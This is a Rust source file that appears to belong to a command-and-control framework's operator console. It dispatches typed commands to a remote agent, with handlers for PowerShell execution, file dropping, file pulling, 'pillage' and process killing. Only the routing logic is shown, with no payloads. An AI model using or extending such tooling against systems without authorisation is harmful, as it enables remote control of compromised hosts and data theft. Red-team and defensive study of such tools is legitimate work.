use crate::{
    state::Cli,
    tasks::task_implementation::{
        change_directory, clear_terminal, copy_file, dir_listing, exit, file_dropper, kill_agent,
        kill_process, list_processes, move_file, pillage, pull_file, pull_notifications_for_agent,
        pwd, remove_agent, run_powershell_command, set_sleep, show_help, show_help_for_command,
        show_server_time, unknown_command,
    },
};

/// Entry point into dispatching tasks on the C2
pub fn dispatch_task(input: String, cli: &mut Cli) {
    // Collect each token individually
    let input_cl = input.clone();
    let tokens: Vec<&str> = input_cl.split_whitespace().collect();
    dispatch_with_agent(tokens, input, cli)
}

fn dispatch_with_agent(tokens: Vec<&str>, raw_input: String, cli: &mut Cli) {
    if tokens.is_empty() {
        return;
    }

    //
    // Important note on usage:
    //
    // If you want to tokenise input where there could be multiple spaces and other tokens such as
    // ", then in the below rather than passing the pattern (which is an array of single chars), pass
    // the `raw_input` param which contains the unmodified, unflattened, and un-tokenised version of what
    // the user passed in.
    //

    match tokens.as_slice() {
        [""] | [" "] => (),
        // generic
        ["exit"] | ["quit"] => exit(),
        ["clear"] | ["cls"] => clear_terminal(cli),
        ["servertime"] => show_server_time(cli),
        ["help"] => show_help(cli),
        ["help", arg] => show_help_for_command(cli, arg),

        // on agent
        ["set", "sleep", time] => set_sleep(time, cli),
        ["ps"] => list_processes(cli),
        ["cd", pat @ ..] => change_directory(cli, pat),
        ["n"] | ["notifications"] => pull_notifications_for_agent(cli),
        ["pwd"] => pwd(cli),
        ["kill_agent"] => kill_agent(cli),
        ["kill", pid] => kill_process(cli, pid),
        ["remove_agent"] => remove_agent(cli),
        ["ls"] => dir_listing(cli),
        ["pillage"] => pillage(cli),
        ["run", args @ ..] => run_powershell_command(cli, args),
        ["drop", args @ ..] => file_dropper(cli, args),
        ["cp", _pat @ ..] | ["copy", _pat @ ..] => copy_file(cli, raw_input),
        ["mv", _pat @ ..] | ["move", _pat @ ..] => move_file(cli, raw_input),
        ["pull", _pat @ ..] => pull_file(cli, raw_input),
        _ => unknown_command(cli),
    }
}
